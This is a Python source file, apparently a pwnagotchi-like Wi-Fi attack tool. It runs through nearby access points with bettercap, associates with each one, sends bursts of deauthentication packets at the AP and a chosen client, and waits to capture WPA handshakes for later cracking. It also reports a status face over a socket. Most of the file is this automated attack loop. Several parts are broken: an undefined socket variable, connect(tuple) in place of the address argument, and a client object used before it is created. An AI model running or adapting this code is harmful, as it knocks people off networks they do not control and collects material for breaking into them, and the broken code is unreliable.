import os, sys
sys.path.insert(1, os.path.join(sys.path[0], '../..'))

import core.bettercap.bettercap as bcap
from core.utils import *
from random import choice
from PIL import Image, ImageFont
from threading import Thread
from time import sleep
import socket
from random import randint
from scapy.all import RandMAC, RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff, Dot11ProbeResp
from json import loads, dumps
from subprocess import getoutput

try:
    import netifaces as nf
except:
    windows = True

class vars:
    beaconExit = False
    framesSent = 0
         
def pwnagotchiHTML(ipTuple, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):
    """
    HTML/text version of the pwnagotchi
    uses unix sockets to communicate with main thread
    """


    class localVars:
        aps = 0
        clients = 0
        face = ""
        exited = False

        faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
            "happy": "(◕‿‿◕)",
            "attacking": "(⌐■_■)",
            "lost": "(≖__≖)",
            "debug": "(#__#)",
            "assoc": "(°▃▃°)",
            "excited": "(☼‿‿☼)",
            "missed": "(ب__ب)",
            "searching": "(ಠ_↼ )"
        }

        console = ""
        handshakes = 0
        exitedSockRunning = False
        reporting = False # to prevent overlapping

    unixSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # wait for connection, once recieved deauth will start
    unixSock.connect(tuple)
    unixSock.setblocking(False)

    def uStatus(stri): # for info
        while 1:
            if localVars.reporting:
                continue
            else:
                unixSock.sendall(stri.encode("utf-8"))
                break

        print("[+] {}".format(stri))

    def checkExited(sock):
        try:
            localVars.exitedSockRunning = True

            print("init sock")

            conn = sock.connect(("127.0.0.1", 62118))

            while True:
                print("sock check".format("-" * 128))
                a = sock.recv(128)
                
                if a.decode("utf-8") == "exit":
                    print("CLOSED SOCKET")
                    unixSock.close()
                    #unixSock.sendall("ack".encode('utf-8'))
                    localVars.exited = True
                    cli.run("exit")

                    sock.sendall("ok".encode("utf-8"))
                    sock.close()

                    localVars.exitedSockRunning = False

                    quit()
                    return
                
        except Exception as e:
            localVars.exitedSockRunning = str(e)
            raise e
            
    def threadReporting(sock):
        # auto reporting thread; reports info to socket
        while True:
            if localVars.exited: return

            localVars.reporting = True
            sock.sendall(str({
                "report": "true",
                "aps": str(localVars.aps),
                "clients": str(localVars.clients),
                "face": str(localVars.face),
                "console": str(localVars.console),
                "handshakes": str(localVars.handshakes)
            }).encode('utf-8'))
            sleep(0.25)
            localVars.reporting = False

            sleep(5)

    Thread(target=checkExited, args=(exitSock,)).start()

    if windows:
        #emulate
        while 1:
            uStatus("very real thing: {}".format(randint(0,255)))
            localVars.face = "({}-{})".format(randint(1,9),randint(1,9))
            sleep(randint(0,4))

            localVars.reporting = True
            unixSock.sendall(str({
                "report": "true",
                "aps": str(localVars.aps),
                "clients": str(localVars.clients),
                "face": str(localVars.face),
                "console": str(localVars.console),
                "handshakes": str(localVars.handshakes),
                "exited": str(localVars.exitedSockRunning)
            }).replace("'", '"').encode('utf-8'))
            sleep(0.25)
            localVars.reporting = False

    Thread(target=threadReporting, daemon=True, args=(unixSock,)).start()

    oldValues = {
        "aps": 0,
        "cli": 0
    }

    deauthed = {} 

    whitelist = []

    if prettyDebug: uStatus("whitelist: {}".format(', '.join(whitelist)))

    cli = bcap.Client()

    cli.recon()
    cli.clearWifi()

    while True:

        json = cli.getPairs()

        localVars.aps = len(json)

        if localVars.aps > oldValues["aps"]:
            localVars.face = localVars.faces["happy"]
        else:
            localVars.face = localVars.faces["lost"]

        if debug: print(json)

        localVars.clients = 0

        for ap in json:
            localVars.clients += len(json[ap][2]['clients'])

        for ap in json.copy():
            fullBreak = False
            pulledHandshake = False
            ssid = json[ap][0]

            localVars.face = localVars.faces["searching"]

            if debug: print("checking ap")



            if ap.lower() in whitelist:
                if debug: print("whitelist")
                if prettyDebug: uStatus("skipped {} due to whitelist".format(ap.lower()))
                continue

            if len(json[ap][2]['clients']) == 0:
                if debug: print("{} doesn't have clients".format(ssid))
                if prettyDebug: uStatus("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                continue # empty

            while True:
    
                targetClient = choice(json[ap][2]["clients"]) # to deauth
                pickNew = False

                if debug: print("loop")

                if targetClient[0].lower() in whitelist:
                    if debug: print("new ap due to whitelist")
                    if prettyDebug: uStatus("skipped {} due to whitelist (2)".format(ap.lower()))
                    fullBreak = True; break # pick new ap

                if ap in deauthed:
                    if debug: print("{} already deauthed; new ap".format(ssid))
                    if prettyDebug: uStatus("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                    json.pop(ap)
                    fullBreak = True; break # pick new ap

                """
                for i in deauthed[ap]:
        
                    if targetClient == i:
                        #pickNew = True; break # pick new choice
                        break # dont have to pick new one
                    else:
                        break
                """

                if debug: print("chose client")
                if prettyDebug: uStatus("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                        
                if pickNew: continue

                break

            if fullBreak: fullBreak = False; continue # if we need to pick new ap

            localVars.console = "associating w {}".format(ap)
            if prettyDebug: uStatus("associating with {} ({})".format(ap, ssid))
            localVars.face = localVars.faces["assoc"]
            cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc

            if debug: print(targetClient)

            localVars.face = localVars.faces["attacking"]
            localVars.console = "deauthing {}".format(ap)
            if prettyDebug: uStatus("deauthing {} ({})".format(ap, ssid))
            for _x in range(deauthMaxTries):
                if pulledHandshake: break
    

                for _z in range(deauthBurst):
        

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(ap))
                    cli.deauth(ap, throttle=0)

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(targetClient[0]))
                    cli.deauth(targetClient[0], throttle=0)
                    # or
                    #cli.scapyDeauth(ap, targetClient[0])
                sleep(5)

                for _y in range(checkHandshakeTries):
        
                    if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                        if prettyDebug: uStatus("got {}'s handshake ({})".format(ap, ssid))
                        localVars.console = "got {}'s handshake".format(ssid)
                        localVars.face = localVars.faces["excited"]
                        localVars.handshakes += 1

                        if ssid == "": # if ssid blank
                            fileField = ap.replace(":", "-") # some systems dont like ":"
                        else: # not blank
                            fileField = ssid

                        if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy

                        deauthed[ap] = [True, targetClient]

                        sleep(nextDelay)

                        pulledHandshake = True

                        break
                    else:
                        if prettyDebug: uStatus("missed {}'s handshake ({})".format(ap, ssid))
                        localVars.console = "missed {} handshake ({})".format(ssid, _y)
                        localVars.face = localVars.faces["lost"]

                    sleep(checkDelay)

            if debug: print(ssid)

            if not pulledHandshake:
                if prettyDebug: uStatus("completely missed {}'s handshakes ({})".format(ap, ssid))
                localVars.console = "completely missed"
                localVars.face = localVars.faces["missed"]
            
            pulledHandshake = False

            sleep(nextDelay)

